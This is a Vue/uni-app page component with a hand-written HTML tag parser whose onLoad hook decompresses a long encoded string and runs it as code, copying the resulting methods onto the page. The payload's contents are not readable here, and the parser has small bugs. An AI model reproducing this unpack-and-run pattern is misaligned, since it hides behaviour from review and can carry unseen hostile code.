
    <template>
        <templateCom :data="html"></templateCom>
    </template>

    <script>
    import { onLoad, onReady } from "@dcloudio/uni-app";
    import { ref, getCurrentInstance } from "vue";
    import templateCom from "../../components/template.vue";

    export default {
        components: {
            templateCom,
        },
        setup() {
            let html = ref("undefind");
            let { proxy } = getCurrentInstance();
            let _this = proxy
            const tychange = (typeofData) => {
                return typeof typeofData === "object"
                    ? JSON.stringify(typeofData)
                    : typeofData;
            };
    
            const parseTag = (tag) => {
                let res = {
                    type1: "tag",
                    name: "",	
                    voidElement: false,
                    // attrs: {},
                    children: [],
                };
                let tagMatch = tag.match(/<\/?([^\s]+?)[/\s>]/);
                if (tagMatch) {
                    // 标签名称为正则匹配的第2项
                    res.type1 = tagMatch[1];
                    if (tag.charAt(tag.length - 2) === "/") {
                        // 判断tag字符串倒数第二项是不是 / 设置为空标签。 例子：<img/>
                        res.voidElement = true;
                    }
                }
                // 匹配所有的标签正则
                let classList = tag.match(/\s([^'"/\s><]+?)\s*?=\s*?(".*?"|'.*?')/g);
                
                if (classList) {
                    let style = ''
                    for (let i = 0; i < classList.length; i++) {
                        // 去空格再以= 分隔字符串  得到['属性名称','属性值']
                
                        let c = classList[i].split("=");
                        // c[1] = c[1].replace(/\s*/g, "")
                        c[0] = c[0].replace(/\s*/g, "")
                        // 循环设置属性
                        var lengthc = 2
                        for(lengthc; lengthc < c.length ; lengthc++){
                            c[1] += "=" + c[lengthc]
                        }
                        let p = c[1].substring(1, c[1].length - 1)
                        try{
                            p = JSON.parse(c[1].substring(1, c[1].length - 1))
                        }catch(e){
                            
                        }
                
                        if (c[1]) {
                            if(c[0] === ' style'){
                            style = p + style
                            res[c[0]] = style
                            }else{
                            res[c[0]] = p
                            }
                    
                        };
                
                    }
                }
                console.log(JSON.parse(JSON.stringify(res, null, 2)));
                return res;
            };
    
            const parse = (html) => {
                var that = _this;
                let result = [];
                let current;
                let level = -1;
                let arr = [];
                let tagRE =
                /<[a-zA-Z\-\!\/](?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])*>/g;
                html.replace(tagRE, function (tag, index) {
                    // 判断第二个字符是不是'/'来判断是否open
                    let isOpen = tag.charAt(1) !== "/";
                    // 获取标签末尾的索引
                    let start = index + tag.length;
                    // 标签之前的文本信息
                    let text = html.slice(start, html.indexOf("<", start));
    
                    let parent;
                    if (isOpen) {
                        level++;
                        // 设置标签属性
                        current = that.parseTag(tag);
                        // 判断是否为文本信息，是就push一个text children  不等于'  '
                        if (!current.voidElement && text.trim()) {
                            current["text"] = text;
                        }
                        // 如果我们是根用户，则推送新的基本节点
                        if (level === 0) {
                            result.push(current);
                        }
                        // 判断有没有上层，有就push当前标签
                        parent = arr[level - 1];
                        if (parent) {
                            parent.children.push(current);
                        }
                        // console.log(current)
                        arr[level] = current;
                    }
                    // 如果不是开标签，或者是空元素：</div><img>
                    if (!isOpen || current.voidElement) {
                        // level--
                        level--;
                    }
                });
                // console.log(JSON.parse(JSON.stringify(result, null, 2)))
                return result;
            };
            onLoad(() => {
                let {pakoRun} = proxy.$pakoRun;
                // console.log(pakoRun)
                let args = {
                    code: `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`,
                };
                if (args) {
                    try {
                        let onLoad = pakoRun(args, args.code);
                        let method = onLoad();
                        for (const key in method) {
                            _this[key] = method[key];
                        }
                        _this.onLoad();
                        // console.log(this);
                    } catch (err) {
                        console.log(err);
                    }
                }
            });
            return { tychange, parseTag, parse, html };
        },
    };
    </script>

    <style lang="scss" scoped></style>
    